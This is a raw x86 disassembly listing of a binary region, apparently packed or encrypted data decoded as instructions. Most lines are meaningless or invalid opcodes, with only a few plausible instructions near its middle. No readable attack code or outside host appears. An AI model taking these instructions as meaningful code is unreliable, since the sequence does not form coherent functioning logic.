  40efe5:	xchg   BYTE PTR [ebx],ah
  40efe7:	mov    ecx,DWORD PTR [edi]
  40efe9:	lds    edi,FWORD PTR [ecx+0x4acb13d4]
  40efef:	jl     0x40f062
  40eff1:	pop    es
  40eff2:	nop
  40eff3:	xor    BYTE PTR cs:[edx+0x262f212],ch
  40effa:	scas   al,BYTE PTR es:[edi]
  40effb:	mov    eax,ds:0x4591e334
  40f000:	and    al,0x95
  40f002:	fcomp  QWORD PTR [ebx+0x5]
  40f005:	jge    0x40f07f
  40f007:	jmp    0xdcbe:0x1d237701
  40f00e:	ins    DWORD PTR es:[edi],dx
  40f00f:	stc    
  40f010:	inc    eax
  40f011:	jle    0x40f010
  40f013:	and    dl,BYTE PTR [ecx-0x51]
  40f016:	imul   eax,DWORD PTR [eax],0xad05a900
  40f01c:	xor    cl,ah
  40f01e:	pop    ss
  40f01f:	hlt    
  40f020:	cmp    al,0x92
  40f022:	adc    al,0x35
  40f024:	sbb    ebp,DWORD PTR [ebx-0x80]
  40f027:	xchg   ebx,eax
  40f028:	push   eax
  40f029:	push   0xb4ccd6d4
  40f02e:	test   BYTE PTR [ebx+ebx*4+0x55ea2e27],bh
  40f035:	jge    0x40f090
  40f037:	mov    ah,0x9b
  40f039:	or     dh,BYTE PTR [ecx+ebx*1+0x70526199]
  40f040:	not    bh
  40f042:	test   eax,0x75a6739d
  40f047:	addr16 leave 
  40f049:	dec    edx
  40f04a:	rol    al,0x27
  40f04d:	sbb    bh,bh
  40f04f:	test   DWORD PTR [ebp+0x72],esp
  40f052:	sbb    ebx,DWORD PTR [edi-0x4f0e6f3c]
  40f058:	ret    
  40f059:	jbe    0x40f042
  40f05b:	(bad)  
  40f05c:	mov    ds:0x3c1aab1,al
  40f061:	hlt    
  40f062:	int3   
  40f063:	jge    0x40f0ca
  40f065:	pop    es
  40f066:	push   0x9092329
  40f06b:	loop   0x40f0ca
  40f06d:	xor    DWORD PTR [eax],ecx
  40f06f:	stc    
  40f070:	hlt    
  40f071:	aaa    
  40f072:	mov    ?,WORD PTR [esi+0x6915a141]
  40f078:	cmp    ebp,eax
  40f07a:	cmp    DWORD PTR [ebp-0x94fd219],edi
  40f080:	push   edi
  40f081:	hlt    
  40f082:	lahf   
  40f083:	and    cl,BYTE PTR [eax+0x77]
  40f086:	push   ebp
  40f087:	adc    bl,BYTE PTR [ecx]
  40f089:	aad    0x5c
  40f08b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f08c:	jp     0x40f03a
  40f08e:	mov    edx,0x70ade937
  40f093:	add    eax,0x9a2fb4ed
  40f098:	or     DWORD PTR [edi-0x75],0xfd9d54f3
  40f09f:	call   0x26c7d017
  40f0a4:	mov    edx,0xfcb88cf8
  40f0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0aa:	loope  0x40f11f
  40f0ac:	mov    al,ds:0x4c8f50e9
  40f0b1:	xor    BYTE PTR [edx-0x44],cl
  40f0b4:	ins    DWORD PTR es:[edi],dx
  40f0b5:	mov    edi,DWORD PTR [edi]
  40f0b7:	cmp    eax,0x1d48ba78
  40f0bc:	frstor [edi+0x71aea8ef]
  40f0c2:	jmp    0x40f073
  40f0c4:	sar    ch,cl
  40f0c6:	xor    BYTE PTR [ebx-0x796ca255],ch
  40f0cc:	sub    bl,ch
  40f0ce:	adc    BYTE PTR [esi+ebx*4+0x34],ch
  40f0d2:	into   
  40f0d3:	outs   dx,BYTE PTR ds:[esi]
  40f0d4:	call   0x81e23aec
  40f0d9:	sbb    al,0xb4
  40f0db:	ffree  st(7)
  40f0dd:	adc    al,0x7b
  40f0df:	icebp  
  40f0e0:	daa    
  40f0e1:	lods   eax,DWORD PTR ds:[esi]
  40f0e2:	aaa    
  40f0e3:	in     eax,dx
  40f0e4:	out    0xf7,al
  40f0e6:	sub    ecx,DWORD PTR [esi-0x74]
  40f0e9:	(bad)  
  40f0ea:	mov    al,ds:0x9e458cf9
  40f0ef:	push   ds
  40f0f0:	adc    ch,dl
  40f0f2:	call   0x3c833683
  40f0f7:	retf   0xc6fd
  40f0fa:	push   0x5b654edf
  40f0ff:	xor    eax,0xaa549b25
  40f104:	stos   DWORD PTR es:[edi],eax
  40f105:	das    
  40f106:	in     eax,dx
  40f107:	data16 mov cl,0xd3
  40f10a:	loope  0x40f08e
  40f10c:	mov    ecx,0x4d6696aa
  40f111:	sti    
  40f112:	sar    DWORD PTR [edi+0x659ff40a],1
  40f118:	sub    eax,0xcf98b772
  40f11d:	jmp    0x2d0e:0xcc6f0ead
  40f124:	stos   BYTE PTR es:[edi],al
  40f125:	jmp    0x6750:0xf8ec29a1
  40f12c:	das    
  40f12d:	mov    bh,0x93
  40f12f:	rol    BYTE PTR [eax],cl
  40f131:	ins    DWORD PTR es:[edi],dx
  40f132:	jmp    0x89dc:0x9dd8c257
  40f139:	and    edi,ebx
  40f13b:	pop    ds
  40f13c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f13d:	mov    eax,0xbfb6f7a
  40f142:	dec    esi
  40f143:	jp     0x40f1a9
  40f145:	sub    al,ah
  40f147:	neg    DWORD PTR ds:0xa1e7e218
  40f14d:	pop    ecx
  40f14e:	imul   edi,edx,0x65
  40f151:	jp     0x40f14d
  40f153:	push   ebx
  40f154:	inc    ecx
  40f155:	in     eax,dx
  40f156:	repnz cwde 
  40f158:	inc    edx
  40f159:	je     0x40f1da
  40f15b:	jg     0x40f1a4
  40f15d:	or     al,0x6b
  40f15f:	mov    ebp,0x5130aedf
  40f164:	repnz lock test DWORD PTR ds:0xfd052b4a,ebp
  40f16c:	or     ebx,DWORD PTR [ebx+0x55830c46]
  40f172:	ror    BYTE PTR [ecx],cl
  40f174:	mov    BYTE PTR [ebx-0x36d2cc6],bl
  40f17a:	iret   
  40f17b:	fistp  QWORD PTR [ebx+0x60c2ed24]
  40f181:	std    
  40f182:	in     al,0x4c
  40f184:	jecxz  0x40f15d
  40f186:	into   
  40f187:	test   BYTE PTR [esi+0x2b1c91cc],al
  40f18d:	jnp    0x40f13f
  40f18f:	sub    al,0xe8
  40f191:	xlat   BYTE PTR ds:[ebx]
  40f192:	dec    esi
  40f193:	sub    ch,0x99
  40f196:	rcr    DWORD PTR [eax],0xd8
  40f199:	jge    0x40f1a6
  40f19b:	inc    ebp
  40f19c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f19d:	addr16 xchg edx,eax
  40f19f:	call   ebx
  40f1a1:	in     al,0x21
  40f1a3:	inc    ecx
  40f1a4:	mov    dh,0x72
  40f1a6:	xchg   esp,eax
  40f1a7:	xor    edx,DWORD PTR [edx-0x3aa10529]
  40f1ad:	bnd ja 0x40f1ab
  40f1b0:	mov    ecx,0xeb687a1d
  40f1b5:	adc    BYTE PTR [ebx-0x60],dh
  40f1b8:	fsubr  DWORD PTR [esi]
  40f1ba:	nop
  40f1bb:	push   edx
  40f1bc:	dec    edi
  40f1bd:	push   cs
  40f1be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1bf:	in     eax,dx
  40f1c0:	xchg   BYTE PTR [ecx],ah
  40f1c2:	popf   
  40f1c3:	mov    ebp,0x5a775d83
  40f1c8:	inc    ebx
  40f1c9:	shld   esp,esi,cl
  40f1cc:	scas   eax,DWORD PTR es:[edi]
  40f1cd:	xor    ch,bl
  40f1cf:	push   es
  40f1d0:	lods   eax,DWORD PTR ds:[esi]
  40f1d1:	mov    al,ds:0x7c52c7a0
  40f1d6:	xchg   ecx,eax
  40f1d7:	sub    eax,0x8f324c18
  40f1dc:	xchg   edi,eax
  40f1dd:	push   edi
  40f1de:	push   ss
  40f1df:	fsub   st(6),st
  40f1e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1e2:	mov    ebp,0x1d33fa37
  40f1e7:	jp     0x40f16d
  40f1e9:	vpxor  xmm0,xmm4,xmm3
  40f1ed:	cmp    ch,0x83
  40f1f0:	or     al,0xe1
  40f1f2:	add    BYTE PTR [ebx-0x50fa340f],al
  40f1f8:	jmp    0x8c8b:0x77611a39
  40f1ff:	outs   dx,DWORD PTR ds:[esi]
  40f200:	sub    BYTE PTR [ebp-0x76d69bd5],bl
  40f206:	loope  0x40f210
  40f208:	call   0xdc23:0x80186887
  40f20f:	sbb    DWORD PTR [eax],edi
  40f211:	sub    dl,0xa
  40f214:	lahf   
  40f215:	repz scas eax,DWORD PTR es:[edi]
  40f217:	mov    esp,0x34d6b397
  40f21c:	inc    edx
  40f21d:	xor    bh,BYTE PTR [edi]
  40f21f:	mov    edx,0x45857d81
  40f224:	and    BYTE PTR [esi+0x21],cl
  40f227:	sbb    edx,edi
  40f229:	and    al,0x8
  40f22b:	jle    0x40f1ef
  40f22d:	icebp  
  40f22e:	out    0x5d,eax
  40f230:	xor    BYTE PTR [esi],0x3c
  40f233:	addr16 and al,0x25
  40f236:	rcr    BYTE PTR [ecx+0x2],0x6
  40f23a:	lock dec esi
  40f23c:	cwde   
  40f23d:	in     eax,0x82
  40f23f:	clc    
  40f240:	repz sbb al,0x1a
  40f243:	cmp    BYTE PTR [edi],0xd4
  40f246:	std    
  40f247:	mov    ds:0x903ec0a9,eax
  40f24c:	ja     0x40f2c8
  40f24e:	push   edi
  40f24f:	xor    DWORD PTR [ebx-0x5d],0x70e321bd
  40f256:	and    DWORD PTR [edi+0x755cfa74],0xb7d976d1
  40f260:	jbe    0x40f240
  40f262:	mov    WORD PTR [ecx-0x22],gs
  40f265:	into   
  40f266:	sub    eax,0x8621ab74
  40f26b:	leave  
  40f26c:	dec    esi
  40f26d:	fadd   st,st(0)
  40f26f:	mov    ds:0x9f94bd7,al
  40f274:	push   eax
  40f275:	sbb    DWORD PTR gs:[eax+0x14880763],ecx
  40f27c:	mov    bl,0x4
  40f27e:	dec    ebx
  40f27f:	clc    
  40f280:	icebp  
  40f281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f282:	mov    eax,0xc89bbf54
  40f287:	dec    ecx
  40f288:	ins    DWORD PTR es:[edi],dx
  40f289:	mov    ds:0x35f34385,al
  40f28e:	add    BYTE PTR [edx],0xe1
  40f291:	pop    es
  40f292:	pop    ss
  40f293:	inc    esp
  40f294:	or     ah,BYTE PTR [esi]
  40f296:	in     eax,dx
  40f297:	retf   
  40f298:	pop    ds
  40f299:	ins    DWORD PTR es:[edi],dx
  40f29a:	mov    BYTE PTR [edi-0x658df973],dl
  40f2a0:	out    dx,al
  40f2a1:	push   esp
  40f2a2:	xor    DWORD PTR [esi-0x1f205566],ebx
  40f2a8:	push   0x7e
  40f2aa:	push   0xffffffcf
  40f2ac:	xchg   ebx,eax
  40f2ad:	cmp    DWORD PTR ds:0xfd12f6e8,ebx
  40f2b3:	js     0x40f2d8
  40f2b5:	jp     0x40f2cb
  40f2b7:	push   es
  40f2b8:	jmp    0x2c9c:0xda022312
  40f2bf:	jmp    0x3c22:0x3771098
  40f2c6:	sub    bl,ah
  40f2c8:	or     BYTE PTR [eax+0x319229ec],0x89
  40f2cf:	push   ss
  40f2d0:	ins    BYTE PTR es:[edi],dx
  40f2d1:	lahf   
  40f2d2:	mov    al,0x64
  40f2d4:	(bad)  
  40f2d5:	fisubr DWORD PTR [edi-0x67]
  40f2d8:	cmp    dl,ah
  40f2da:	ret    
  40f2db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2dc:	mov    dh,0x47
  40f2de:	inc    eax
  40f2df:	or     cl,BYTE PTR [edx]
  40f2e1:	pop    ecx
  40f2e2:	sub    ebp,DWORD PTR [eax-0x6c1bbfc1]
  40f2e8:	test   eax,0x2a62d249
  40f2ed:	(bad)  
  40f2ee:	dec    ebp
  40f2ef:	out    dx,al
  40f2f0:	inc    edx
  40f2f1:	int    0xd4
  40f2f3:	xor    eax,esi
  40f2f5:	add    eax,edi
  40f2f7:	push   eax
  40f2f8:	mov    eax,DWORD PTR [ebp-0x18]
  40f2fb:	add    eax,0xee
  40f300:	push   eax
  40f301:	mov    eax,DWORD PTR [ebp-0x18]
  40f304:	mov    eax,DWORD PTR [eax+0x198]
  40f30a:	jmp    0x40f815
  40f30f:	enter  0x3ec7,0xce
  40f313:	aad    0xd5
  40f315:	enter  0x6cc5,0x2b
  40f319:	xchg   edi,eax
  40f31a:	and    esi,DWORD PTR [esi]
  40f31c:	out    0xd2,al
  40f31e:	punpcklbw mm2,DWORD PTR [eax+0x78]
  40f322:	js     0x40f38e
  40f324:	jl     0x40f39e
  40f326:	js     0x40f2c7
  40f328:	test   DWORD PTR [eax-0x1c],edi
  40f32b:	(bad)  
  40f32c:	pop    es
  40f32d:	pop    ds
  40f32e:	call   0x8bab:0x84515f30
  40f335:	outs   dx,DWORD PTR ds:[esi]
  40f336:	int3   
  40f337:	pop    ss
  40f338:	jmp    0x7613:0x132f6f54
  40f33f:	hlt    
  40f340:	sbb    BYTE PTR [edx],dh
  40f342:	xor    ebx,DWORD PTR [ebp-0x60]
  40f345:	mov    ebp,DWORD PTR [edx+edx*8-0x5edf3138]
  40f34c:	std    
  40f34d:	ror    DWORD PTR [esp+ebp*8],cl
  40f350:	add    eax,0x80b96c09
  40f355:	and    edx,edi
  40f357:	mov    al,ds:0x238d9df6
  40f35c:	or     ah,bh
  40f35e:	sub    esi,DWORD PTR [ebp+0x17a0c988]
  40f364:	or     BYTE PTR [ebx+0x65ee0285],bh
  40f36a:	xchg   esp,eax
  40f36b:	jno    0x40f2f8
  40f36d:	push   esi
  40f36e:	mov    cl,0x60
  40f370:	outs   dx,DWORD PTR ds:[esi]
  40f371:	pop    edi
  40f372:	xchg   esi,eax
  40f373:	push   ebp
  40f374:	add    eax,DWORD PTR [ebp-0x4b1720f8]
  40f37a:	ds iret 
  40f37c:	xor    BYTE PTR [ecx],bh
  40f37e:	add    BYTE PTR [edx],cl
  40f380:	loopne 0x40f324
  40f382:	fcmovnbe st,st(1)
  40f384:	test   DWORD PTR [ebx],edi
  40f386:	imul   ecx,DWORD PTR [ebx],0xa80db9c4
  40f38c:	xchg   edx,eax
  40f38d:	je     0x40f3ae
  40f38f:	jns    0x40f3bb
  40f391:	sbb    al,BYTE PTR [bp+di+0xc42]
  40f396:	shr    BYTE PTR [ebp+0x720cc36b],1
  40f39c:	ret    0xa2b9
  40f39f:	inc    edi
  40f3a0:	dec    edi
  40f3a1:	mov    bh,0x4
  40f3a3:	neg    BYTE PTR [ebp-0x6dcb3c8f]
  40f3a9:	dec    esi
  40f3aa:	pop    esp
  40f3ab:	out    dx,al
  40f3ac:	mov    edx,0x6286da4f
  40f3b1:	jo     0x40f378
  40f3b3:	add    bl,BYTE PTR [edi]
  40f3b5:	or     DWORD PTR [edi+0x39],esi
  40f3b8:	ffreep st(7)
  40f3ba:	add    esp,DWORD PTR [eax+0x58]
  40f3bd:	stos   DWORD PTR es:[di],eax
  40f3bf:	xchg   edx,eax
  40f3c0:	das    
  40f3c1:	out    dx,al
  40f3c2:	dec    edi
  40f3c3:	loopne 0x40f3d6
  40f3c5:	inc    eax
  40f3c6:	and    BYTE PTR [eax+ebp*2],ch
  40f3c9:	and    al,ch
  40f3cb:	lea    ecx,[eax+0x68]
  40f3ce:	add    DWORD PTR [eax],esi
  40f3d0:	out    dx,eax
  40f3d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3d2:	pushf  
  40f3d3:	xor    ah,BYTE PTR [eax+esi*4]
  40f3d6:	jne    0x40f3e3
  40f3d8:	call   0xb090:0xe20c8ab8
  40f3df:	lahf   
  40f3e0:	fldenv [ecx]
  40f3e2:	add    DWORD PTR [esi+0x2],edi
  40f3e5:	mov    edx,0x23fe2957
  40f3ea:	inc    edx
  40f3eb:	pop    edi
  40f3ec:	dec    eax
  40f3ed:	lea    eax,[eax+0x12]
  40f3f0:	add    ecx,DWORD PTR [edi-0x45]
  40f3f3:	gs js  0x40f3ed
  40f3f6:	and    DWORD PTR [edi],eax
  40f3f8:	mov    ch,bl
  40f3fa:	jg     0x40f3e9
  40f3fc:	dec    ecx
  40f3fd:	mov    ds:0x1485569d,eax
  40f402:	push   edx
  40f403:	sub    eax,0x900c870d
  40f408:	jmp    0x620ccab8
  40f40d:	adc    ch,ch
  40f40f:	shl    DWORD PTR ds:0xfec714ee,cl
  40f415:	sbb    al,dh
  40f417:	inc    eax
  40f418:	sbb    al,0x58
  40f41a:	pop    ss
  40f41b:	inc    esi
  40f41c:	js     0x40f475
  40f41e:	adc    ah,BYTE PTR [edi]
  40f420:	inc    esp
  40f421:	dec    ebx
  40f422:	fwait
  40f423:	push   0xffffffa9
  40f425:	push   cs
  40f426:	xor    cl,BYTE PTR [esi-0x3e]
  40f429:	add    eax,DWORD PTR [esi+0x1a]
  40f42c:	mov    ebx,0x7a309d60
  40f431:	dec    edx
  40f432:	inc    ebp
  40f433:	repz pushf 
  40f435:	jecxz  0x40f4a4
  40f437:	push   cs
  40f438:	cmp    al,0x73
  40f43a:	jle    0x40f3e5
  40f43c:	aam    0x5d
  40f43e:	idiv   edi
  40f440:	add    cl,bl
  40f442:	sbb    eax,DWORD PTR [ecx-0x342eff10]
  40f448:	inc    ebx
  40f449:	fisttp WORD PTR [ecx-0x5e3e4d71]
  40f44f:	xchg   ebp,eax
  40f450:	jo     0x40f475
  40f452:	mov    esp,0xc592d98
  40f457:	fsubp  st(3),st
  40f459:	xchg   esp,eax
  40f45a:	sub    esp,esi
  40f45c:	jmp    0xf527ab08
  40f461:	lock pop es
  40f463:	adc    eax,0x5223d6dd
  40f468:	repz and eax,DWORD PTR [eax-0x49dad7df]
  40f46f:	xor    BYTE PTR [esi+0x7336a8fc],ch
  40f475:	mov    edx,0x29fe925b
  40f47a:	sbb    DWORD PTR [ecx-0x1e9b6c42],0x2
  40f481:	mov    ch,0x7c
  40f483:	outs   dx,BYTE PTR ds:[esi]
  40f484:	jne    0x40f49a
  40f486:	loope  0x40f431
  40f488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f489:	mov    ch,0x66
  40f48b:	enter  0x10a2,0xc4
  40f48f:	push   ecx
  40f490:	push   edx
  40f491:	in     eax,0x2
  40f493:	test   al,0xd8
  40f495:	in     eax,dx
  40f496:	cmp    DWORD PTR [edx-0x31cc0a0d],esp
  40f49c:	pop    ebx
  40f49d:	push   esp
  40f49e:	or     cl,BYTE PTR [esi+0x1a]
  40f4a1:	xor    esp,DWORD PTR [ebp+0x60a48b8a]
  40f4a7:	sahf   
  40f4a8:	mov    al,0xff
  40f4aa:	js     0x40f504
  40f4ac:	sub    al,BYTE PTR [edx+ebp*4+0xc]
  40f4b0:	comiss xmm6,DWORD PTR [eax+0xc9c62ef]
  40f4b7:	in     al,0x81
  40f4b9:	xor    DWORD PTR [ecx+edi*4+0x42],0xc35eb5f9
  40f4c1:	adc    DWORD PTR [esi+0x1bb1d703],ebp
  40f4c7:	sbb    ecx,eax
  40f4c9:	rcr    DWORD PTR cs:[edx+0x38],1
  40f4cd:	jb     0x40f4ac
  40f4cf:	into   
  40f4d0:	shl    BYTE PTR [ecx+ebp*1],cl
  40f4d3:	hlt    
  40f4d4:	pusha  
  40f4d5:	mov    ss,WORD PTR [edi]
  40f4d7:	sub    DWORD PTR [ebx+0x34],edx
  40f4da:	or     ecx,DWORD PTR [ecx-0x5b]
  40f4dd:	test   DWORD PTR [ecx-0x2e],ebx
  40f4e0:	cmp    DWORD PTR [esi+0x11addc0f],ebx
  40f4e6:	sub    BYTE PTR [ebx+0x41fd68a7],ah
  40f4ec:	(bad)  
  40f4ed:	fmul   st,st(4)
  40f4ef:	aas    
  40f4f0:	sub    DWORD PTR [edi],edx
  40f4f2:	fnstsw WORD PTR [edx-0x3cadd165]
  40f4f8:	dec    ebx
  40f4f9:	inc    esp
  40f4fa:	(bad)  
  40f4fc:	cmp    DWORD PTR [ebx-0x75],edx
  40f4ff:	push   cs
  40f500:	adc    al,0x2b
  40f502:	sahf   
  40f503:	(bad)  
  40f504:	fistp  QWORD PTR [edx]
  40f506:	gs pop esp
  40f508:	jae    0x40f4b7
  40f50a:	sub    BYTE PTR [edx],bh
  40f50c:	xchg   ecx,eax
  40f50d:	push   cs
  40f50e:	fild   DWORD PTR [esi]
  40f510:	test   DWORD PTR [ebp-0x6],0xef70d3f2
  40f517:	enter  0xc781,0x9
  40f51b:	jl     0x40f535
  40f51d:	push   ds
  40f51e:	scas   al,BYTE PTR es:[edi]
  40f51f:	hlt    
  40f520:	lods   al,BYTE PTR ds:[esi]
  40f521:	mov    esi,ecx
  40f523:	mov    bl,0x98
  40f525:	bound  esp,QWORD PTR [ecx-0x4c1bc995]
  40f52b:	or     DWORD PTR [edx-0x1a06f001],ecx
  40f531:	cmp    DWORD PTR [ebp-0x28],ebp
  40f534:	jmp    0x3e9068bd
  40f539:	adc    dl,al
  40f53b:	ss adc ax,0xcc6e
  40f540:	in     eax,0x73
  40f542:	push   es
  40f543:	mov    ah,0xa
  40f545:	stos   DWORD PTR es:[edi],eax
  40f546:	xchg   edx,eax
  40f547:	cs sbb al,0x80
  40f54a:	xchg   edx,eax
  40f54b:	mov    ebp,0x6bc9311f
  40f550:	outs   dx,BYTE PTR ds:[esi]
  40f551:	mov    esi,0x195a2946
  40f556:	das    
  40f557:	stos   DWORD PTR es:[edi],eax
  40f558:	ret    0x1ac1
  40f55b:	xchg   BYTE PTR [edx+0x45fdf128],dl
  40f561:	lods   al,BYTE PTR ds:[esi]
  40f562:	mov    BYTE PTR [ecx-0x721a3484],bh
  40f568:	ins    BYTE PTR es:[edi],dx
  40f569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f56a:	jp     0x40f5d6
  40f56c:	(bad)  
  40f56d:	cmp    BYTE PTR [edx+eax*2],bl
  40f570:	cli    
  40f571:	repnz mov eax,ds:0x60d60f5e
  40f577:	outs   dx,BYTE PTR ds:[esi]
  40f578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f579:	int    0x5
  40f57b:	shl    DWORD PTR [eax],cl
  40f57d:	cwde   
  40f57e:	scas   eax,DWORD PTR es:[edi]
  40f57f:	mov    DWORD PTR [ebp+0xe],edx
  40f582:	or     esp,esp
  40f584:	push   0x1de6d57
  40f589:	shr    BYTE PTR [edi+0xe],cl
  40f58c:	dec    esp
  40f58d:	popa   
  40f58e:	add    esp,DWORD PTR [ebx+0x545a5dda]
  40f594:	xchg   edx,eax
  40f595:	idiv   BYTE PTR [ebx-0x50]
  40f598:	jno    0x40f5c2
  40f59a:	mov    ebx,0xc40d6d08
  40f59f:	and    BYTE PTR [edx+0x3a],bh
  40f5a2:	xchg   ebx,eax
  40f5a3:	icebp  
  40f5a4:	cmc    
  40f5a5:	call   0x8bd5:0xb4a413b6
  40f5ac:	das    
  40f5ad:	ja     0x40f616
  40f5af:	leave  
  40f5b0:	mov    es,WORD PTR [esi]
  40f5b2:	div    BYTE PTR ds:0x221148fc
  40f5b8:	push   ebp
  40f5b9:	sbb    DWORD PTR [esi-0x2cf32ccf],edi
  40f5bf:	lock js 0x40f55b
  40f5c2:	add    edx,esi
  40f5c4:	dec    eax
  40f5c5:	fs sub cl,bh
  40f5c8:	sbb    dl,BYTE PTR [edx+0x6]
  40f5cb:	mov    dl,0x9d
  40f5cd:	dec    ecx
  40f5ce:	adc    BYTE PTR [edi-0x29dad017],al
  40f5d4:	call   0xd58b:0x682985e8
  40f5db:	sub    BYTE PTR [esi-0x6cfbd6b6],al
  40f5e1:	into   
  40f5e2:	out    dx,al
  40f5e3:	int    0x0
  40f5e5:	sbb    dl,dl
  40f5e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5e8:	cmp    DWORD PTR [eax-0x79],0x38843dbe
  40f5ef:	dec    esi
  40f5f0:	push   DWORD PTR [ecx+0x3a]
  40f5f3:	lea    esp,[esi-0x51601119]
  40f5f9:	in     al,dx
  40f5fa:	rol    BYTE PTR [edx-0x3529272],cl
  40f600:	leave  
  40f601:	and    al,0x9d
  40f603:	push   esp
  40f604:	fisttp WORD PTR [ecx+0x41]
  40f607:	pop    ss
  40f608:	mov    ds:0x69b705fa,eax
  40f60d:	cmp    edi,DWORD PTR [edi+0x21fdcdd]
  40f613:	retf   0x16ed
  40f616:	push   cs
  40f617:	jae    0x40f668
  40f619:	lahf   
  40f61a:	pop    es
  40f61b:	sbb    esi,DWORD PTR [esi]
  40f61d:	jecxz  0x40f632
  40f61f:	stos   DWORD PTR es:[edi],eax
  40f620:	pop    ebp
  40f621:	push   0x5
  40f623:	sbb    ebp,ebx
  40f625:	daa    
  40f626:	add    eax,0x9ee53dc8
  40f62b:	mov    ds:0xa2768a31,al
  40f630:	cmc    
  40f631:	int    0x76
  40f633:	aad    0xd7
  40f635:	daa    
  40f636:	jmp    0x7c48:0x82b265f8
  40f63d:	mov    ds:0xa3638f05,eax
  40f642:	push   cs
  40f643:	and    BYTE PTR [ebx],0x4e
  40f646:	je     0x40f611
  40f648:	inc    edi
  40f649:	mov    esp,DWORD PTR [edx+esi*2+0x3d4e60e1]
  40f650:	jmp    0x60452470
  40f655:	mov    WORD PTR [ecx+ebx*1-0x36],?
  40f659:	cmc    
  40f65a:	push   0x5c
  40f65c:	or     eax,0x4f200860
  40f661:	aaa    
  40f662:	pushf  
  40f663:	outs   dx,DWORD PTR ds:[esi]
  40f664:	add    eax,DWORD PTR [edi+0x5]
  40f667:	pop    ds
  40f668:	jbe    0x40f685
  40f66a:	cmp    al,BYTE PTR [esi]
  40f66c:	mov    ebp,0x6a372f45
  40f671:	add    al,0x8f
  40f673:	hlt    
  40f674:	popa   
  40f675:	mov    edx,0xc4f4e994
  40f67a:	jnp    0x40f6d9
  40f67c:	in     eax,dx
  40f67d:	cmc    
  40f67e:	ret    
  40f67f:	mov    al,ds:0xee48bf9c
  40f684:	jo     0x40f6f5
  40f686:	jae    0x40f631
  40f688:	mov    esp,0x82c32925
  40f68d:	jg     0x40f670
  40f68f:	inc    eax
  40f690:	dec    eax
  40f691:	cmp    DWORD PTR [ecx-0x408b6bbf],esi
  40f697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f698:	shl    BYTE PTR [ebp+eiz*2+0x64199ef0],0xe
  40f6a0:	sbb    DWORD PTR [esi+ecx*2],edx
  40f6a3:	ins    DWORD PTR es:[edi],dx
  40f6a4:	dec    esp
  40f6a5:	dec    edx
  40f6a6:	dec    edx
  40f6a7:	call   0xe87c:0x822a9269
  40f6ae:	mov    al,ds:0xe8fc90ca
  40f6b3:	(bad)  
  40f6b4:	stc    
  40f6b5:	iret   
  40f6b6:	out    0x59,eax
  40f6b8:	fld    QWORD PTR [ecx-0x745a3209]
  40f6be:	iret   
  40f6bf:	inc    edx
  40f6c0:	(bad)  
  40f6c1:	fadd   QWORD PTR [ebx]
  40f6c3:	repz rcr DWORD PTR [eax],0xd9
  40f6c7:	jge    0x40f652
  40f6c9:	scas   eax,DWORD PTR es:[edi]
  40f6ca:	sar    ch,0x86
  40f6cd:	fadd   st(4),st
  40f6cf:	int    0xfb
  40f6d1:	jle    0x40f738
  40f6d3:	sbb    bl,BYTE PTR ds:0xf8d7cfeb
  40f6d9:	xor    eax,0x836d3fbf
  40f6de:	cld    
  40f6df:	sub    esp,DWORD PTR ds:[edi-0x2f]
  40f6e3:	and    ah,BYTE PTR [esi+ecx*2]
  40f6e6:	jge    0x40f6d6
  40f6e8:	popf   
  40f6e9:	(bad)  
  40f6ea:	pop    edi
  40f6eb:	loope  0x40f760
  40f6ed:	(bad)  
  40f6ee:	cwde   
  40f6ef:	pop    esi
  40f6f0:	call   0xd921:0xd77cc105
  40f6f7:	xlat   BYTE PTR ds:[ebx]
  40f6f8:	daa    
  40f6f9:	aam    0x2d
  40f6fb:	add    edx,DWORD PTR [ebx+ecx*2+0x59]
  40f6ff:	xor    dh,ch
  40f701:	jbe    0x40f72a
  40f703:	fs jns 0x40f716
  40f706:	(bad)  
  40f707:	jg     0x40f6d3
  40f709:	add    DWORD PTR [ebx],ebx
  40f70b:	inc    edi
  40f70c:	rcr    DWORD PTR [ecx-0x4c],1
  40f70f:	gs xor cx,bp
  40f713:	imul   eax
  40f715:	push   edx
  40f716:	jo     0x40f73a
  40f718:	mov    ch,0x8b
  40f71a:	pushf  
  40f71b:	loop   0x40f6ae
  40f71d:	cli    
  40f71e:	js     0x40f6d2
  40f720:	scas   al,BYTE PTR es:[edi]
  40f721:	inc    ebp
  40f722:	and    DWORD PTR [eax],esp
  40f724:	cmp    al,BYTE PTR [ecx+0x41b43dc4]
  40f72a:	add    ebp,edx
  40f72c:	mov    ebp,0xc68f2335
  40f731:	sub    BYTE PTR [esi],dl
  40f733:	sbb    DWORD PTR [ebp-0x190cf72f],ebp
  40f739:	jo     0x40f724
  40f73b:	xor    eax,0x8ac9bd99
  40f740:	sub    bl,BYTE PTR [esi]
  40f742:	test   DWORD PTR [eax-0x5b],edi
  40f745:	popf   
  40f746:	je     0x40f7c2
  40f748:	pop    eax
  40f749:	mov    ebp,esp
  40f74b:	push   cs
  40f74c:	cmp    ah,BYTE PTR [ebp+0x2c]
  40f74f:	and    esi,0xc5f97be
  40f755:	inc    eax
  40f756:	mov    BYTE PTR [edx-0x1b],dh
  40f759:	hlt    
  40f75a:	sbb    cl,ch
  40f75c:	mov    ebp,0x615c942a
  40f761:	inc    esi
  40f762:	push   eax
  40f763:	mov    ecx,0xde8aa4c7
  40f768:	out    0x65,eax
  40f76a:	push   0x65defa14
  40f76f:	icebp  
  40f770:	inc    esp
  40f771:	push   eax
  40f772:	add    BYTE PTR [esi+eax*2],al
  40f775:	dec    eax
  40f776:	aaa    
  40f777:	out    0xb5,al
  40f779:	clc    
  40f77a:	mov    ebp,0xede9ef19
